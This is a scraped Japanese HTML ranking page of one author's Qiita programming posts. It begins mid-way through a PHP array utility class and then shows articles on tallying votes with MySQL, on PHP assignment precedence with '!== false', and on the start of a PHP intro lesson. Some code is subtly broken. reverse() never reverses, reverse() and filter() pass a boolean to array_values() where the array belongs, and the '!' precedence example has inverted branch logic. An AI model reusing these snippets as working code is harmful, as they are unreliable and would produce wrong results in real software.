    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">combine</span><span class="p">(</span><span class="k">array</span> <span class="nv">$keys</span><span class="p">,</span> <span class="k">array</span> <span class="nv">$values</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$keys</span> <span class="o">=</span> <span class="nb">array_values</span><span class="p">(</span><span class="nv">$keys</span><span class="p">);</span>
        <span class="nv">$values</span> <span class="o">=</span> <span class="nb">array_values</span><span class="p">(</span><span class="nv">$values</span><span class="p">);</span>
        <span class="nv">$ret</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$keys</span> <span class="k">as</span> <span class="nv">$i</span> <span class="o">=&gt;</span> <span class="nv">$key</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$values</span><span class="p">[</span><span class="nv">$i</span><span class="p">]))</span> <span class="p">{</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="nv">$ret</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$values</span><span class="p">[</span><span class="nv">$i</span><span class="p">];</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nv">$ret</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">values</span><span class="p">(</span><span class="k">array</span> <span class="nv">$arr</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$ret</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$arr</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$item</span><span class="p">))</span> <span class="p">{</span>
                <span class="nv">$item</span> <span class="o">=</span> <span class="nx">self</span><span class="o">::</span><span class="na">values</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="nv">$ret</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$item</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nv">$ret</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">reverse</span><span class="p">(</span><span class="k">array</span> <span class="nv">$arr</span><span class="p">,</span> <span class="nv">$preserve_keys</span> <span class="o">=</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$arr</span> <span class="k">as</span> <span class="o">&amp;</span><span class="nv">$item</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$item</span><span class="p">))</span> <span class="p">{</span>
                <span class="nv">$item</span> <span class="o">=</span> <span class="nx">self</span><span class="o">::</span><span class="na">reverse</span><span class="p">(</span><span class="nv">$item</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nv">$preserve_keys</span> <span class="o">?</span> <span class="nv">$arr</span> <span class="o">:</span> <span class="nb">array_values</span><span class="p">(</span><span class="nv">$preserve_keys</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="k">array</span> <span class="nv">$arr</span><span class="p">,</span> <span class="nv">$callback</span> <span class="o">=</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$preserve_keys</span> <span class="o">=</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$arr</span> <span class="k">as</span> <span class="o">&amp;</span><span class="nv">$item</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$item</span><span class="p">))</span> <span class="p">{</span>
                <span class="nv">$item</span> <span class="o">=</span> <span class="nx">self</span><span class="o">::</span><span class="na">filter</span><span class="p">(</span><span class="nv">$item</span><span class="p">,</span> <span class="nv">$callback</span><span class="p">,</span> <span class="nv">$preserve_keys</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="nv">$arr</span> <span class="o">=</span> <span class="nb">array_filter</span><span class="p">(</span><span class="nv">$arr</span><span class="p">,</span> <span class="nv">$callback</span><span class="p">);</span>
        <span class="k">return</span> <span class="nv">$preserve_keys</span> <span class="o">?</span> <span class="nv">$arr</span> <span class="o">:</span> <span class="nb">array_values</span><span class="p">(</span><span class="nv">$preserve_keys</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">map</span><span class="p">(</span><span class="nv">$callback</span><span class="p">,</span> <span class="k">array</span> <span class="nv">$arr</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">self</span><span class="o">::</span><span class="nv">$tmp</span> <span class="o">=</span> <span class="nv">$callback</span><span class="p">;</span>
        <span class="nb">array_walk_recursive</span><span class="p">(</span><span class="nv">$arr</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="no">__CLASS__</span><span class="p">,</span> <span class="s1">'_map'</span><span class="p">));</span>
        <span class="k">return</span> <span class="nv">$arr</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">flatten</span><span class="p">(</span><span class="k">array</span> <span class="nv">$arr</span><span class="p">,</span> <span class="nv">$preserve_keys</span> <span class="o">=</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">self</span><span class="o">::</span><span class="nv">$tmp</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
        <span class="nb">array_walk_recursive</span><span class="p">(</span><span class="nv">$arr</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="no">__CLASS__</span><span class="p">,</span> <span class="s1">'_flatten'</span><span class="p">),</span> <span class="nv">$preserve_keys</span><span class="p">);</span>
        <span class="k">return</span> <span class="nx">self</span><span class="o">::</span><span class="nv">$tmp</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">sum</span><span class="p">(</span><span class="k">array</span> <span class="nv">$arr</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">self</span><span class="o">::</span><span class="nv">$tmp</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="nb">array_walk_recursive</span><span class="p">(</span><span class="nv">$arr</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="no">__CLASS__</span><span class="p">,</span> <span class="s1">'_sum'</span><span class="p">));</span>
        <span class="k">return</span> <span class="nx">self</span><span class="o">::</span><span class="nv">$tmp</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">product</span><span class="p">(</span><span class="k">array</span> <span class="nv">$arr</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">self</span><span class="o">::</span><span class="nv">$tmp</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
        <span class="nb">array_walk_recursive</span><span class="p">(</span><span class="nv">$arr</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="no">__CLASS__</span><span class="p">,</span> <span class="s1">'_product'</span><span class="p">));</span>
        <span class="k">return</span> <span class="nx">self</span><span class="o">::</span><span class="nv">$tmp</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">unique</span><span class="p">(</span><span class="k">array</span> <span class="nv">$arr</span><span class="p">,</span> <span class="nv">$preserve_keys</span> <span class="o">=</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$base</span> <span class="o">=</span> <span class="nv">$arr</span><span class="p">;</span>
        <span class="nx">self</span><span class="o">::</span><span class="na">sort</span><span class="p">(</span><span class="nv">$base</span><span class="p">);</span>
        <span class="nx">self</span><span class="o">::</span><span class="na">asort</span><span class="p">(</span><span class="nv">$arr</span><span class="p">);</span>
        <span class="k">list</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span> <span class="nv">$arr</span><span class="p">)</span> <span class="o">=</span> <span class="nx">self</span><span class="o">::</span><span class="na">_unique</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span> <span class="nv">$arr</span><span class="p">);</span>
        <span class="k">return</span> <span class="nv">$preserve_keys</span> <span class="o">?</span> <span class="nv">$arr</span> <span class="o">:</span> <span class="nv">$base</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">_map</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$tmp</span> <span class="o">=</span> <span class="nx">self</span><span class="o">::</span><span class="nv">$tmp</span><span class="p">;</span>
        <span class="nv">$v</span> <span class="o">=</span> <span class="nv">$tmp</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">_flatten</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span> <span class="nv">$k</span><span class="p">,</span> <span class="nv">$preserve_keys</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$preserve_keys</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">self</span><span class="o">::</span><span class="nv">$tmp</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$v</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nx">self</span><span class="o">::</span><span class="nv">$tmp</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$v</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">_sum</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">self</span><span class="o">::</span><span class="nv">$tmp</span> <span class="o">+=</span> <span class="nv">$v</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">_product</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">self</span><span class="o">::</span><span class="nv">$tmp</span> <span class="o">*=</span> <span class="nv">$v</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">_unique</span><span class="p">(</span><span class="k">array</span> <span class="nv">$base</span><span class="p">,</span> <span class="k">array</span> <span class="nv">$arr</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$ret</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="k">array</span><span class="p">(),</span> <span class="k">array</span><span class="p">());</span>
        <span class="nv">$keys</span> <span class="o">=</span> <span class="nb">array_keys</span><span class="p">(</span><span class="nv">$arr</span><span class="p">);</span>
        <span class="nv">$values</span> <span class="o">=</span> <span class="nb">array_values</span><span class="p">(</span><span class="nv">$arr</span><span class="p">);</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$base</span> <span class="k">as</span> <span class="nv">$i</span> <span class="o">=&gt;</span> <span class="nv">$item</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$item</span><span class="p">))</span> <span class="p">{</span>
                <span class="k">list</span><span class="p">(</span><span class="nv">$item</span><span class="p">,</span> <span class="nv">$values</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">=</span> <span class="nx">self</span><span class="o">::</span><span class="na">_unique</span><span class="p">(</span><span class="nv">$item</span><span class="p">,</span> <span class="nv">$values</span><span class="p">[</span><span class="nv">$i</span><span class="p">]);</span>
            <span class="p">}</span>
            <span class="nv">$serial</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$check</span><span class="p">[</span><span class="nv">$serial</span><span class="p">]))</span> <span class="p">{</span>
                <span class="nv">$check</span><span class="p">[</span><span class="nv">$serial</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
                <span class="nv">$ret</span><span class="p">[</span><span class="mi">0</span><span class="p">][]</span> <span class="o">=</span> <span class="nv">$item</span><span class="p">;</span>
                <span class="nv">$ret</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="nv">$keys</span><span class="p">[</span><span class="nv">$i</span><span class="p">]]</span> <span class="o">=</span> <span class="nv">$values</span><span class="p">[</span><span class="nv">$i</span><span class="p">];</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nv">$ret</span><span class="p">;</span>
    <span class="p">}</span>

<span class="p">}</span>
</pre></div></div>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />52位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>16</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/a7720726a1e1bbc820fb">MySQLで投票を集計してランキングを降順で取得する</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-08-25 02:03:07</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> <b>[MySQL]</b> <b>[PDO]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>タイトルの通り。</p>

<h1>
<span id="例-ポケモン人気投票" class="fragment"></span><a href="#%E4%BE%8B-%E3%83%9D%E3%82%B1%E3%83%A2%E3%83%B3%E4%BA%BA%E6%B0%97%E6%8A%95%E7%A5%A8"><i class="fa fa-link"></i></a>例： ポケモン人気投票</h1>

<h2>
<span id="voteテーブルの内容" class="fragment"></span><a href="#vote%E3%83%86%E3%83%BC%E3%83%96%E3%83%AB%E3%81%AE%E5%86%85%E5%AE%B9"><i class="fa fa-link"></i></a><code>vote</code>テーブルの内容</h2>

<p>実際は <code>pokemon_id</code> みたいに管理してると思うけど分かりやすさのために今回は名前そのままにしました</p>

<table>
<thead>
<tr>
<th style="text-align: center">id</th>
<th style="text-align: center">pokemon</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: center">1</td>
<td style="text-align: center">コイル</td>
</tr>
<tr>
<td style="text-align: center">2</td>
<td style="text-align: center">コイル</td>
</tr>
<tr>
<td style="text-align: center">3</td>
<td style="text-align: center">ピカチュウ</td>
</tr>
<tr>
<td style="text-align: center">4</td>
<td style="text-align: center">コイル</td>
</tr>
<tr>
<td style="text-align: center">5</td>
<td style="text-align: center">ピカチュウ</td>
</tr>
<tr>
<td style="text-align: center">6</td>
<td style="text-align: center">コイル</td>
</tr>
<tr>
<td style="text-align: center">7</td>
<td style="text-align: center">シェイミ</td>
</tr>
<tr>
<td style="text-align: center">8</td>
<td style="text-align: center">コイル</td>
</tr>
<tr>
<td style="text-align: center">9</td>
<td style="text-align: center">ギラティナ</td>
</tr>
</tbody>
</table>

<h2>
<span id="欲しい結果" class="fragment"></span><a href="#%E6%AC%B2%E3%81%97%E3%81%84%E7%B5%90%E6%9E%9C"><i class="fa fa-link"></i></a>欲しい結果</h2>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>array(4) {
  [0]=&gt;
  object(stdClass)#1 (2) {
    ["pokemon"]=&gt;
    string(9) "コイル"
    ["sum"]=&gt;
    string(1) "5"
  }
  [1]=&gt;
  object(stdClass)#2 (2) {
    ["pokemon"]=&gt;
    string(15) "ピカチュウ"
    ["sum"]=&gt;
    string(1) "2"
  }
  [2]=&gt;
  object(stdClass)#3 (2) {
    ["pokemon"]=&gt;
    string(12) "シェイミ"
    ["sum"]=&gt;
    string(1) "1"
  }
  [3]=&gt;
  object(stdClass)#4 (2) {
    ["pokemon"]=&gt;
    string(15) "ギラティナ"
    ["sum"]=&gt;
    string(1) "1"
  }
}
</pre></div></div>

<h2>
<span id="sql文" class="fragment"></span><a href="#sql%E6%96%87"><i class="fa fa-link"></i></a>SQL文</h2>

<p><strong><code>SUM(1)</code></strong> が決め手。</p>

<div class="code-frame" data-lang="mysql"><div class="highlight"><pre><span></span><span class="k">SELECT</span> <span class="ss">`pokemon`</span><span class="p">,</span> <span class="nf">SUM</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="k">AS</span> <span class="ss">`sum`</span>
<span class="k">FROM</span> <span class="ss">`vote`</span>
<span class="k">GROUP</span> <span class="k">BY</span> <span class="ss">`pokemon`</span>
<span class="k">ORDER</span> <span class="k">BY</span> <span class="ss">`sum`</span> <span class="k">DESC</span>
</pre></div></div>

<p>PHPでどう扱うかに関しては下記を参照してください。</p>

<h3>
<span id="qiita---phpでデータベースに接続するときのまとめ" class="fragment"></span><a href="#qiita---php%E3%81%A7%E3%83%87%E3%83%BC%E3%82%BF%E3%83%99%E3%83%BC%E3%82%B9%E3%81%AB%E6%8E%A5%E7%B6%9A%E3%81%99%E3%82%8B%E3%81%A8%E3%81%8D%E3%81%AE%E3%81%BE%E3%81%A8%E3%82%81"><i class="fa fa-link"></i></a><a href="http://qiita.com/mpyw/items/b00b72c5c95aac573b71" id="reference-a8189cc44cb2873504a4">Qiita - PHPでデータベースに接続するときのまとめ</a>
</h3>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />53位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>15</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/b097da196baf47e58ed9">「!== false」 V.S. 「false !==」</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-12-20 17:00:56</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="導入" class="fragment"></span><a href="#%E5%B0%8E%E5%85%A5"><i class="fa fa-link"></i></a>導入</h1>

<h3>
<span id="php-manual---array_search" class="fragment"></span><a href="#php-manual---array_search"><i class="fa fa-link"></i></a><a href="http://php.net/manual/ja/function.array-search.php" rel="nofollow noopener" target="_blank">PHP Manual - array_search</a>
</h3>

<p>配列から探したい値に対応するキーを取ってくる関数です。見つからなかった場合には <strong>FALSE</strong> が返されます。この記事の内容には直接関係ないですが、この関数にはいろいろ落とし穴があるので注意してください。</p>

<ul>
<li>結果の比較には <code>===</code> <code>!==</code> を使わなければならない</li>
<li>第3引数 <em><code>$strict</code></em> は <strong>TRUE</strong> にすることが推奨される</li>
</ul>

<p>さて、これを例として問題を提起します。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="cm">/* 問題 */</span>
<span class="k">echo</span> <span class="s2">"ランダムに選出したアルファベットはH～Nの中に含まれているか？</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
<span class="k">echo</span> <span class="s2">"またそのアルファベットは(Hから数えて)何番目のアルファベットか？</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
<span class="k">echo</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>

<span class="cm">/* 変数の準備 */</span>
<span class="nv">$range</span> <span class="o">=</span> <span class="nb">range</span><span class="p">(</span><span class="s1">'H'</span><span class="p">,</span> <span class="s1">'N'</span><span class="p">);</span>       <span class="c1">// 限定する範囲</span>
<span class="nv">$all</span> <span class="o">=</span> <span class="nb">range</span><span class="p">(</span><span class="s1">'A'</span><span class="p">,</span> <span class="s1">'Z'</span><span class="p">);</span>         <span class="c1">// 全範囲</span>
<span class="nv">$rand</span> <span class="o">=</span> <span class="nv">$all</span><span class="p">[</span><span class="nb">array_rand</span><span class="p">(</span><span class="nv">$all</span><span class="p">)];</span> <span class="c1">// ランダムに選出されたアルファベット</span>

<span class="cm">/* 判定と表示 */</span>
<span class="nv">$pos</span> <span class="o">=</span> <span class="nb">array_search</span><span class="p">(</span><span class="nv">$rand</span><span class="p">,</span> <span class="nv">$range</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$pos</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
    <span class="nb">printf</span><span class="p">(</span><span class="s2">"アルファベット[%s]は[%d]番目にありました</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="nv">$rand</span><span class="p">,</span> <span class="nv">$pos</span><span class="p">);</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="nb">printf</span><span class="p">(</span><span class="s2">"アルファベット[%s]は見つかりませんでした</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="nv">$rand</span><span class="p">);</span>
<span class="p">}</span>
</pre></div></div>

<p>この場面において</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$pos</span> <span class="o">=</span> <span class="nb">array_search</span><span class="p">(</span><span class="nv">$rand</span><span class="p">,</span> <span class="nv">$range</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$pos</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span> <span class="p">}</span>
</pre></div></div>

<p>を1つにまとめたいとき、あなたならどう書きますか・・・？</p>

<h1>
<span id="考察" class="fragment"></span><a href="#%E8%80%83%E5%AF%9F"><i class="fa fa-link"></i></a>考察</h1>

<h2>
<span id="-false-を用いたとき" class="fragment"></span><a href="#-false-%E3%82%92%E7%94%A8%E3%81%84%E3%81%9F%E3%81%A8%E3%81%8D"><i class="fa fa-link"></i></a><code>!== false</code> を用いたとき</h2>

<p>以下のコードは正しく動作しません。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nv">$pos</span> <span class="o">=</span> <span class="nb">array_search</span><span class="p">(</span><span class="nv">$rand</span><span class="p">,</span> <span class="nv">$range</span><span class="p">,</span> <span class="k">true</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span> <span class="p">}</span>
</pre></div></div>

<p>何故ならば <strong><code>=</code></strong><ins>より</ins><strong><code>!==</code></strong><ins>の方が優先度が高い</ins>ことにより、array_search関数の返り値と <strong>FALSE</strong> を比較した結果が <em><code>$pos</code></em> に代入されてしまうからです。この書き方をしたい場合には</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">((</span><span class="nv">$pos</span> <span class="o">=</span> <span class="nb">array_search</span><span class="p">(</span><span class="nv">$rand</span><span class="p">,</span> <span class="nv">$range</span><span class="p">,</span> <span class="k">true</span><span class="p">))</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span> <span class="p">}</span>
</pre></div></div>

<p>として明示的に評価の順番を変更する必要があります。</p>

<h2>
<span id="false--を用いたとき" class="fragment"></span><a href="#false--%E3%82%92%E7%94%A8%E3%81%84%E3%81%9F%E3%81%A8%E3%81%8D"><i class="fa fa-link"></i></a><code>false !==</code> を用いたとき</h2>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="k">false</span> <span class="o">!==</span> <span class="nv">$pos</span> <span class="o">=</span> <span class="nb">array_search</span><span class="p">(</span><span class="nv">$rand</span><span class="p">,</span> <span class="nv">$range</span><span class="p">,</span> <span class="k">true</span><span class="p">))</span> <span class="p">{</span> <span class="p">}</span>
</pre></div></div>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="k">false</span> <span class="o">!==</span> <span class="p">(</span><span class="nv">$pos</span> <span class="o">=</span> <span class="nb">array_search</span><span class="p">(</span><span class="nv">$rand</span><span class="p">,</span> <span class="nv">$range</span><span class="p">,</span> <span class="k">true</span><span class="p">)))</span> <span class="p">{</span> <span class="p">}</span>
</pre></div></div>

<p>実はコレ、どっちでも動いちゃうんです。</p>

<h4>
<span id="--が省略できる理由" class="fragment"></span><a href="#--%E3%81%8C%E7%9C%81%E7%95%A5%E3%81%A7%E3%81%8D%E3%82%8B%E7%90%86%E7%94%B1"><i class="fa fa-link"></i></a><code>( )</code> が省略できる理由</h4>

<p><ins>異なる順番で評価されれば、それが代入式として無効なものとなる</ins>のが理由です。代入式は必ず <strong>$変数 = 値;</strong> という形である必要がありますが、<code>false !== $pos</code> が先に評価されてしまった場合、次に評価される代入式は <strong>値 = 値;</strong> という形になってしまいます。そこでPHPがこのようなものは例外として考えて、順番を自動的に最適化してくれているのです。</p>

<h2>
<span id="他の例" class="fragment"></span><a href="#%E4%BB%96%E3%81%AE%E4%BE%8B"><i class="fa fa-link"></i></a>他の例</h2>

<p>他によく見る例として、 下記のような <code>!</code> 演算子でのケースが考えられるでしょうか。これも同様の省略を行うことが出来ます。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$str</span> <span class="o">=</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_GET</span><span class="p">,</span> <span class="s1">'str'</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$len</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$str</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">"入力された文字列は</span><span class="si">{</span><span class="nv">$len</span><span class="si">}</span><span class="s2">バイトです"</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">"文字列が入力されていません"</span><span class="p">;</span>
<span class="p">}</span>
</pre></div></div>

<h1>
<span id="まとめ" class="fragment"></span><a href="#%E3%81%BE%E3%81%A8%E3%82%81"><i class="fa fa-link"></i></a>まとめ</h1>

<p>このときはこっちで書く、あのときはあっちで書く、というようにその時に応じて切り替えるのはあまり気持ちのいいことではない気がするので、常日頃<ins>「値」を「代入式」より先に書く</ins>ように心がけてみてもいいかもしれません。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />54位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>15</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/176fb1f6fb75da74339f"> 【PHP入門講座】 PHPで出来ることと処理の流れ</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-11-25 07:47:08</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP入門講座]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h3>
<span id="目次に戻る" class="fragment"></span><a href="#%E7%9B%AE%E6%AC%A1%E3%81%AB%E6%88%BB%E3%82%8B"><i class="fa fa-link"></i></a><a href="http://qiita.com/mpyw/items/752e19a578cf7d96fc5f" id="reference-f57c1bbe1375d88769c9">目次に戻る</a>
</h3>

<h1>
<span id="php言語の特徴" class="fragment"></span><a href="#php%E8%A8%80%E8%AA%9E%E3%81%AE%E7%89%B9%E5%BE%B4"><i class="fa fa-link"></i></a>PHP言語の特徴</h1>

<h2>
<span id="htmlの中に埋め込むことが出来る" class="fragment"></span><a href="#html%E3%81%AE%E4%B8%AD%E3%81%AB%E5%9F%8B%E3%82%81%E8%BE%BC%E3%82%80%E3%81%93%E3%81%A8%E3%81%8C%E5%87%BA%E6%9D%A5%E3%82%8B"><i class="fa fa-link"></i></a>HTMLの中に埋め込むことが出来る</h2>

<p>PHPファイルは、何も特別なことを書かなければただのHTMLファイルと同じ扱いを受けます。</p>

<div class="code-frame" data-lang="html+php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
